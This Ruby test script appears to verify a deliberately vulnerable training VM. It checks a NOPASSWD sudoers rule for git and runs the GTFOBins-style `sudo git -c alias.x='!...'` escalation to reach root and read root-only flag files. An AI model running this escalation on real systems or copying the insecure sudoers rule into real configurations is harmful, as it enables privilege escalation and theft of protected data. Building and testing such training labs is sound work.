require_relative '../../../../../lib/post_provision_test'


class SudoRootGitTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_git'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # Both read_facts are checked below: leaked_filenames in tier 1 (root-only
    # mode) and tier 2 (readable via sudo git), strings_to_leak in tier 2
    # (content matches). No other inputs exist.
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('git installed', 'test -x /usr/bin/git && echo present', 'present')
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_git", 'root:root 440')
      test_local_command('sudoers rule allows git as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_git', 'ALL  ALL=(root) NOPASSWD: /bin/git, /usr/bin/git')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers syntax valid', 'visudo -c 2>&1', 'parsed OK')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # any unprivileged account sees the rule the way a student would
      test_local_command('unprivileged user lists the git sudo rule', 'sudo -n -l', '/usr/bin/git', user: 'nobody')
      # git has no id verb, so show root via a git alias (an alias beginning
      # with ! runs a shell command), the same mechanism as the GTFOBins entry.
      test_local_command('unprivileged user runs a command as root through sudo git',
                         %q{sudo -n git -c alias.x='!id' x}, 'uid=0(root)', user: 'nobody')
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        read_cmd = %Q{sudo -n git -c alias.x='!cat #{Shellwords.escape("/root/#{fname}")}' x}
        test_local_command("unprivileged user reads leaked #{fname} via sudo git", read_cmd, s.strip.lines.first.to_s.strip, user: 'nobody')
        test_local_command("unprivileged user cannot read #{fname} directly",
                           "cat #{Shellwords.escape("/root/#{fname}")} 2>&1", 'Permission denied', user: 'nobody')
      end
    end
    tier(3) do
      # Exploit proof: a brand-new unprivileged account (not a pre-seeded one
      # like nobody) escalates to a root shell through the sudo git
      # misconfiguration and reads the root-only flag. GTFOBins (git, sudo):
      # `git -p help config` then `!/bin/sh` at the pager spawns a root shell;
      # the same shell-escape family is driven non-interactively here via a git
      # alias beginning with ! (an alias prefixed with ! runs a shell command),
      # so it needs no tty. <privilege>root_rwx</privilege>: the escalated shell
      # must be uid=0(root), asserted below. with_throwaway_ssh_user deletes the
      # account on the way out; the exploit only reads files, so nothing else to
      # undo.
      with_throwaway_ssh_user do |user, _pass|
        payload = (['id'] + leaked.map { |f| "cat #{Shellwords.escape("/root/#{f}")}" }).join('; ')
        escalate = %Q{sudo -n git -c alias.x='!#{payload}' x}
        r = run_as_user(user, escalate)
        out = r[:stdout].to_s

        if out =~ /uid=0\(root\)/
          pass_check('tier3: fresh unprivileged user escalates to root via sudo git (GTFOBins)',
                     "as #{user}: #{escalate} -> #{out[/uid=\S+/]} — <privilege>=root_rwx verified", tier: 3)
        else
          add_evidence('sudo -n -l for throwaway user', as_user_command(user, 'sudo -n -l', sudo: !proxmox?))
          fail_check('tier3: fresh unprivileged user escalates to root via sudo git (GTFOBins)',
                     "as #{user}: #{escalate} did not yield a root shell (stdout: #{out.strip[0, 200].inspect}, stderr: #{r[:stderr].to_s.strip[0, 200].inspect})", tier: 3)
        end

        strings.each_with_index do |s, i|
          f = leaked[i]
          next if f.nil? || s.strip.empty?
          expected = s.strip.lines.first.to_s.strip
          if out.include?(expected)
            pass_check("tier3: root shell reads root-only #{f}",
                       "leaked content #{expected.inspect} recovered from /root/#{f} through the escalated root shell", tier: 3)
          else
            fail_check("tier3: root shell reads root-only #{f}",
                       "could not recover #{expected.inspect} from /root/#{f} (stdout: #{out.strip[0, 200].inspect})", tier: 3)
          end
        end
      end
    end
  end

end

SudoRootGitTest.new.run
